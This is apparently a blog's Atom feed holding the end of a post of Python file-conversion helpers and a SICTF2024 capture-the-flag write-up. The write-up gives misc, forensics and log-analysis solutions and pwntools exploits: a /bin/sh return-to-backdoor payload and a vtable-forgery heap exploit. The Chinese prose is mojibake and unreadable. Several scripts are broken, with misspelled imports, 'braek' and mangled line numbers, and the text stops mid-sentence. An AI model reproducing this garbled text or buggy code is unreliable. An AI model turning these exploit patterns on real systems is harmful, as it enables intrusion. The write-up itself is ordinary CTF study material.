class="line"></span><br><span class="line">input_file = <span class="string">&#x27;11.txt&#x27;</span></span><br><span class="line">output_file = <span class="string">&#x27;22.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">reverse_content(input_file, output_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å»é™¤ç©ºæ ¼å’Œæ¢è¡Œç¬¦</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">remove_whitespace_and_newlines</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> input_f:</span><br><span class="line">        content = input_f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å»é™¤ç©ºæ ¼å’Œæ¢è¡Œç¬¦</span></span><br><span class="line">    content = content.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:</span><br><span class="line">        output_f.write(content)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&#x27;22.txt&#x27;</span></span><br><span class="line">output_file = <span class="string">&#x27;11.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">remove_whitespace_and_newlines(input_file, output_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶è¯»å–åå…­è¿›åˆ¶ï¼Œè½¬æ¢ä¸ºæ–‡ä»¶</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># ä»æ–‡ä»¶ä¸­è¯»å–åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        hex_string = f.read().strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—</span></span><br><span class="line">    bytes_data = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†å­—èŠ‚åºåˆ—å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bytes_data)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&quot;11.txt&quot;</span></span><br><span class="line">output_file = <span class="string">&quot;output&quot;</span>  <span class="comment"># è¾“å‡ºæ–‡ä»¶ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› ä¸ºåå…­è¿›åˆ¶æ˜¯å­—èŠ‚æ•°æ®</span></span><br><span class="line"></span><br><span class="line">hex_to_file(input_file, output_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åˆ†å‡ºå­—èŠ‚ç &lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SICTF2024</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/SICTF2024/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/SICTF2024/</id>
    <published>2024-02-25T16:00:00.000Z</published>
    <updated>2024-03-02T08:33:55.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SICTF2024"><a href="#SICTF2024" class="headerlink" title="SICTF2024"></a>SICTF2024</h1><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="çœŸğŸ’¨ç­¾åˆ°"><a href="#çœŸğŸ’¨ç­¾åˆ°" class="headerlink" title="çœŸğŸ’¨ç­¾åˆ°"></a>çœŸğŸ’¨ç­¾åˆ°</h3><ul><li>åŠ å¯†zipæ–‡ä»¶åŒ…æœ€åä¸€ä¸²æ•°å­—ï¼Œ5456545454565458414259555854585458434152595958415a435959595558563d<ul><li>16è¿›åˆ¶è½¬å­—ç¬¦TVTTTVTXABYUXTXTXCARYYXAZCYYYUXV&#x3D;</li><li><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu">å­—ç¬¦æ–‡æœ¬è§£å¯†</a> 2024HappyNewYear</li></ul></li><li>zipè§£å‹åä¸€ä¸ªéŸ³é¢‘ä¸€ä¸ªå›¾ç‰‡<ul><li>éŸ³é¢‘ç”¨Audacity <strong>æ³¨æ„éŸ³é¢‘åç§°</strong></li><li>ç”¨steghideè§£ç   steghide extract -sf steg.jpg</li></ul></li></ul><h3 id="New-Yearâ€™s-regret"><a href="#New-Yearâ€™s-regret" class="headerlink" title="New Yearâ€™s regret"></a>New Yearâ€™s regret</h3><ul><li><p>å¯†ç æ˜¯2024SICTF</p></li><li><p>01ç”»å›¾ï¼ˆèµ›åšå¨å­ï¼‰ï¼Œæ±‰ä¿¡ç ï¼Œä»¥åŠå‹ç¼©åŒ…æœ«å°¾å‘ç°å­—ç¬¦ä¸²ï¼Œå°è¯•hexç¼–ç ï¼ˆè€ƒè™‘é€†å‘è¾“å…¥ï¼‰</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;43637d135333&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#333531d73634--&gt;351Ã—64</span></span><br></pre></td></tr></table></figure><p>ç”»å›¾ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX1=<span class="number">351</span></span><br><span class="line">MAX2=<span class="number">64</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX1,MAX2))</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01ç &quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX2):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX1):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i]==<span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226121035339.png" alt="image-20240226121035339"></p><ul><li>music-sheet-cipherè§£ç å¾—ä¸€éƒ¨åˆ†ï¼š</li></ul><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226121133988.png" alt="image-20240226121133988"></p><ul><li><p>010å¦ä¸€æ–‡ä»¶æœ‰å‹ç¼©åŒ…å’Œpngå›¾ç‰‡ï¼Œkaliåˆ†ç¦»<br>å‹ç¼©åŒ…è§£å‹base64å¾ªç¯</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bases64 <span class="keyword">import</span> b64ecode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_data</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data=re.sub(<span class="string">r&#x27;flag|[â¼€-é¾¥]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,data)</span><br><span class="line">        decode_data=b64ecode(data)</span><br><span class="line">        <span class="keyword">return</span> decode_data.decode(),<span class="literal">True</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> data.<span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag_new.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;ute-8&#x27;</span>)<span class="keyword">as</span> file:</span><br><span class="line">    date = file.read()</span><br><span class="line">iterations = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data,can_decode=process_data(data)</span><br><span class="line">    iterations+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> can_decode:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;result&quot;</span>,data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;rotatin&quot;</span>,iterations)</span><br><span class="line">        braek</span><br></pre></td></tr></table></figure></li><li><p>æˆ˜åŒå¸•ç±³ä»€æ­¦å™¨æ˜Ÿçº§ï¼Œï¼Œï¼Œ</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">44664654464566654465645644544664654654644546445446646565444454544664654664544545646454544454466465465645644</span><br></pre></td></tr></table></figure><p>è€ƒè™‘æ‘©æ–¯å¯†ç ï¼Œ4ä¸ºâ€.â€,6â€-â€œ,5ä¸ºç©ºæ ¼</p><p>ä¸‰éƒ¨åˆ†æ‹¼èµ·æ¥</p></li></ul></li></ul><h3 id="GeekChallege"><a href="#GeekChallege" class="headerlink" title="GeekChallege"></a>GeekChallege</h3><h3 id="ç¥ç§˜çš„æµé‡"><a href="#ç¥ç§˜çš„æµé‡" class="headerlink" title="ç¥ç§˜çš„æµé‡"></a>ç¥ç§˜çš„æµé‡</h3><p><em>é¢˜â½¬æè¿°ï¼š</em></p><p><em>flagå€¼ï¼šSICTF{b50936c7-b60d-411e-a91f-304937164b9c}</em></p><p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py">https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py</a></p><p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py">https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py</a></p><p>ä½¿â½¤ cs-extract-key.py â¼¯å…· å¯ä»¥å¾—åˆ° AES key : HMAC key</p><p>ç„¶åâ½¤ cs-parse-http-traffic.py å°±å¯ä»¥æ‹¿åˆ°æ˜â½‚</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/">https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/</a></p><h3 id="WHOï¼ŸWHOï¼ŸWHOï¼Ÿ"><a href="#WHOï¼ŸWHOï¼ŸWHOï¼Ÿ" class="headerlink" title="WHOï¼ŸWHOï¼ŸWHOï¼Ÿ"></a>WHOï¼ŸWHOï¼ŸWHOï¼Ÿ</h3><p>1ã€archprçˆ†ç ´å¯†ç ä¸ºqweqwe</p><p>2ã€ä½¿â½¤é›¶å®½åå¾—åˆ°â¼€ä¸²rabbitè§£å¯†ï¼Œä¸”å¯†ç å°±æ˜¯é—®é¢˜çš„ç­”æ¡ˆï¼Œå¯†ç ä¸ºshumu</p><p>3ã€æ ¹æ®â½‚ä»¶é¢˜â½¬æâ½°ä½¿â½¤DNAè§£å¯†å¾—åˆ°flag</p><h3 id="æ—¥å¿—åˆ†æ-1"><a href="#æ—¥å¿—åˆ†æ-1" class="headerlink" title="æ—¥å¿—åˆ†æ 1"></a>æ—¥å¿—åˆ†æ 1</h3><p>SICTF{é»‘å®¢æ‰€æ¥å…¥çš„IPåœ°å€|é»‘å®¢æ‰€åˆ›å»ºçš„ç”¨æˆ·å|é»‘å®¢æ‰€åŠ å…¥çš„ç”¨æˆ·ç»„|é»‘å®¢åˆ›å»ºçš„è®¡åˆ’å|åˆ›å»ºè®¡åˆ’ä»»åŠ¡çš„å¯¹è±¡åé—¨æ‰€å¤„çš„è·¯å¾„ï¼ˆå°å†™ç›˜ç¬¦â€¦â€¦,åé—¨è·¯å¾„ç²¾ç¡®åˆ°****.exeï¼‰|é»‘å®¢è¿œç¨‹ç™»é™†RDPçš„è´¦æˆ·}<br> åé—¨è·¯å¾„ç²¾ç¡®åˆ°****.exe</p><p>ç›´æ¥ä½¿ç”¨windowså·¥å…·ç­›æŸ¥</p><p>{192.168.222.200|attack$|Administrators|callback|c:\windows\system32\windows_at*</p><p><em>tack.exe|ADOFLMB\attack$}</em></p><h3 id="æ—¥å¿—åˆ†æ2"><a href="#æ—¥å¿—åˆ†æ2" class="headerlink" title="æ—¥å¿—åˆ†æ2"></a>æ—¥å¿—åˆ†æ2</h3><p><em>SICTF{æ”»å‡»è€…çš„IPåœ°å€|æ”»å‡»è€…å¾—åˆ°Webåº”â½¤åå°ç®¡ç†æƒé™çš„â½…æ³•|æ”»å‡»è€…åœ¨SQLæ³¨â¼Šæ”»å‡»è¿‡ç¨‹ä¸­ä½¿â½¤</em></p><p><em>çš„â¾ƒåŠ¨åŒ–â¼¯å…·åç§°|â¼¯å…·ç‰ˆæœ¬å·|æ”»å‡»è€…ä½¿â½¤çš„Webshellè¿æ¥â¼¯å…·ï¼ˆä¸­â½‚åï¼‰|â¼¯å…·ç‰ˆæœ¬å·}</em></p><p><em>flagå€¼ï¼šSICTF{10.11.35.95|æš´â¼’ç ´è§£|sqlmap|1.2.4.18|èšå‰‘|2.1}</em></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Signin-pwn"><a href="#Signin-pwn" class="headerlink" title="Signin-pwn"></a>Signin-pwn</h3><p>readä¹‹åè°ƒâ½¤äº†strlenï¼Œå°±ä¼šæŠŠrdiè®¾ç½®ä¸ºbugçš„åœ°å€ï¼Œæ‰€ä»¥åªéœ€è¦bufä»¥&#x2F;bin&#x2F;shå¼€å¤´ï¼Œç„¶åç›´æ¥æ”¹è¿”å›åœ°å€åˆ°backdoorçš„systemé‚£â¾¥å³å¯</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">backdoor=<span class="number">0x4011f4</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;length:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;command:&#x27;</span>)</span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;/bin/sh\0x00&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>,</span><br><span class="line">    backdoor</span><br><span class="line">])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Eeeeasy-Cpp"><a href="#Eeeeasy-Cpp" class="headerlink" title="Eeeeasy Cpp"></a>Eeeeasy Cpp</h3><p>æ€è·¯æ˜¯æ³„éœ²å †åœ°å€ç„¶åä¼ªé€ vtableï¼ŒæŠŠè™šè¡¨æŒ‡é’ˆæŒ‡å‘ä¼ªé€ çš„vtableå†callâ¼€ä¸‹å®Œæˆåˆ©â½¤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span> from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="number">2</span> context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="number">3</span> context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span> def <span class="built_in">get</span>(name, passwd):</span><br><span class="line"><span class="number">6</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>&gt;&gt; <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">7 p.sendline(b&#x27;</span>G<span class="number">&#x27;</span>)</span><br><span class="line"><span class="number">8</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>name: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">9 p.sendline(name)</span></span><br><span class="line"><span class="string">10 p.recvuntil(b&#x27;</span>password: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">11 p.sendline(passwd)</span></span><br><span class="line"><span class="string">12</span></span><br><span class="line"><span class="string">13 def show():</span></span><br><span class="line"><span class="string">14 p.recvuntil(b&#x27;</span>&gt;&gt; <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">15 p.sendline(b&#x27;</span>P<span class="number">&#x27;</span>)</span><br><span class="line"><span class="number">1617</span> <span class="meta">#p = process(<span class="string">&#x27;./EeeeasyCpp&#x27;</span>)</span></span><br><span class="line"><span class="number">18</span> p = <span class="built_in">remote</span>(<span class="string">&#x27;xxxxxx&#x27;</span>, xxxx)</span><br><span class="line"><span class="number">19</span> <span class="meta"># set offset to 0x40 to check <span class="keyword">if</span> the offset is correct by comparing with vtable</span></span><br><span class="line"><span class="number">20</span> offset = <span class="number">0x48</span></span><br><span class="line"><span class="number">21</span> <span class="keyword">try</span>:</span><br><span class="line"><span class="number">22</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>gift: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">23 main = int(p.recvuntil(b&#x27;</span>\n<span class="number">&#x27;</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="number">24</span> base = main - <span class="number">0x2650</span></span><br><span class="line"><span class="number">25</span> <span class="built_in">success</span>(<span class="string">&#x27;base addr -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(base)))</span><br><span class="line"><span class="number">26</span> backdoor = base + <span class="number">0x22e0</span></span><br><span class="line"><span class="number">27</span> vtable = base + <span class="number">0x4d48</span></span><br><span class="line"><span class="number">28</span></span><br><span class="line"><span class="number">29</span> <span class="built_in">info</span>(<span class="string">&#x27;vtable -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(vtable)))</span><br><span class="line"><span class="number">30</span> <span class="meta">#gdb.attach(p)</span></span><br><span class="line"><span class="number">31</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">32</span> b<span class="number">&#x27;123&#x27;</span>,</span><br><span class="line"><span class="number">33</span> <span class="built_in">flat</span>([</span><br><span class="line"><span class="number">34</span> b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">0x10</span>,</span><br><span class="line"><span class="number">35</span> <span class="number">0</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">36</span> vtable, <span class="built_in">bytes</span>([offset])</span><br><span class="line"><span class="number">37</span> ])</span><br><span class="line"><span class="number">38</span> )</span><br><span class="line"><span class="number">39</span> <span class="built_in">show</span>()</span><br><span class="line"><span class="number">40</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>Name: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">41 ptr = u64(p.recvuntil(b&#x27;</span>\n<span class="number">&#x27;</span>)[:<span class="number">-1</span>].<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line"><span class="number">42</span> <span class="meta"># heap</span></span><br><span class="line"><span class="number">43</span> <span class="built_in">success</span>(<span class="string">&#x27;ptr -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(ptr)))</span><br><span class="line"><span class="number">44</span> <span class="keyword">if</span> ptr == <span class="number">0</span>:</span><br><span class="line"><span class="number">45</span> raise <span class="built_in">Exception</span>(<span class="string">&#x27;name addr is 0&#x27;</span>)</span><br><span class="line"><span class="number">46</span> <span class="meta"># rollback</span></span><br><span class="line"><span class="number">47</span> name_addr = ptr - <span class="number">0x38</span></span><br><span class="line"><span class="number">48</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">49</span> <span class="built_in">flat</span>([name_addr]),</span><br><span class="line"><span class="number">50</span> <span class="built_in">flat</span>([<span class="number">0x21</span>])</span><br><span class="line"><span class="number">51</span> )</span><br><span class="line"><span class="number">52</span> <span class="meta"># <span class="keyword">if</span> name is 123, rollback success</span></span><br><span class="line"><span class="number">53</span> <span class="meta"># show()</span></span><br><span class="line"><span class="number">54</span> fake_vtable = name_addr</span><br><span class="line"><span class="number">55</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">56</span> <span class="built_in">flat</span>([backdoor, backdoor]), <span class="meta"># check by setting backdoor to main</span></span><br><span class="line"><span class="number">57</span> <span class="built_in">flat</span>([</span><br><span class="line"><span class="number">58</span> b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">0x10</span>,</span><br><span class="line"><span class="number">59</span> <span class="number">0</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">60</span> fake_vtable, name_addr</span><br><span class="line"><span class="number">61</span> ])</span><br><span class="line"><span class="number">62</span> )</span><br><span class="line"><span class="number">63</span> <span class="meta"># get or show will trigger the backdoor</span></span><br><span class="line"><span class="number">64</span> <span class="built_in">show</span>()</span><br><span class="line"><span class="number">65</span> p.<span class="built_in">interactive</span>()</span><br><span class="line"><span class="number">66</span></span><br><span class="line"><span class="number">67</span> except Exception as e:</span><br><span class="line"><span class="number">68</span> <span class="built_in">print</span>(<span class="string">&quot;error: &quot;</span>, e)</span><br><span class="line"><span class="number">69</span> p.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><h3 id="Bug-Zapper"><a href="#Bug-Zapper" class="headerlink" title="Bug Zapper"></a>Bug Zapper</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ‚¨æ˜¯å¦ç»å¸¸è¢«bugçƒ¦æ¼ï¼Ÿæ‚¨æ˜¯å¦æƒ³è¦â¼€æ¬¾å®‰å…¨ï¼Œâ¾¼æ•ˆï¼Œæ²¡æœ‰ä»»ä½•é¢å¤–å‰¯äº§å‡ºçš„æ€â¾å™¨ï¼Ÿ*</span><br><span class="line"></span><br><span class="line">*è¯·é€‰æ‹©æˆ‘ä»¬ï¼æˆ‘ä»¬æ˜¯å€¼å¾—æ‚¨ä¿¡èµ–çš„æ€â¾ä¸“å®¶ï¼â½†è®ºä»€ä¹ˆbugï¼Œæˆ‘ä»¬éƒ½èƒ½â½´å³ç”„åˆ«å¹¶å¤„ç†ï¼æˆ‘ä»¬Bug*</span><br><span class="line"></span><br><span class="line">*Zapperéƒ‘é‡æ‰¿è¯ºï¼Œç»ä¸æ”¾è¿‡ä»»ä½•â¼€ä¸ªshellcodeï¼*</span><br><span class="line"></span><br><span class="line">*Bug Zapperç­â¾å‰‚ï¼Œâ¼€æ‰«å°±ç­ï¼Œè®©bugâ½†å¤„å¯é€ƒï¼*</span><br><span class="line"></span><br><span class="line">*Bug Zapperç­â¾å‰‚ï¼Œè®©ä½ å†™çš„å¼€â¼¼ï¼Œâ½¤çš„æ”¾â¼¼ã€‚</span><br></pre></td></tr></table></figure><p>è¾“â¼Šâ»“åº¦ä¸â¼¤äº0x10ï¼Œä½¿å¾—syscallçš„æ—¶å€™è°ƒâ½¤å·åœ¨0x55ï¼ˆcreatï¼‰åˆ°0x65ï¼ˆptraceï¼‰</p><p>ç„¶åéœ€è¦åœ¨å‰ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯0çš„æƒ…å†µä¸‹ï¼Œsyscallåè¿”å›å€¼ä¸º0ï¼Œæœ‰3ä¸ªè°ƒâ½¤å¯ä»¥ç¬¦åˆ</p><p>åˆ†åˆ«æ˜¯fchmodï¼ˆ0x5bï¼‰ï¼Œ 